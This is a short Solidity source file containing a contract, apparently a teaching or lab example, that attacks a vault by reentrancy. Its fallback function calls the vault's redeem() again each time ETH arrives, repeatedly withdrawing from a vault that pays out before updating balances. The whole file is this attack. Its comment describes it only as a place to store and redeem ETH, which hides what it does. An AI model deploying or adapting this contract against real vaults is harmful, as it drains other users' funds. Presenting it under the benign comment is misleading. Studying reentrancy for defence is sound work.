// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.34;

interface IVault {
    function store() external payable;
    function redeem() external;
}

// You can store ETH in this contract and redeem them.
contract Reentrency {

    IVault private _vault;

    constructor(address vaultAddress, uint value) payable {
        _vault = IVault(vaultAddress);
        _vault.store{value: value}();
    }

    fallback() external payable {
        _vault.redeem();
    }

    function redeem() external {
        _vault.redeem();
    }

}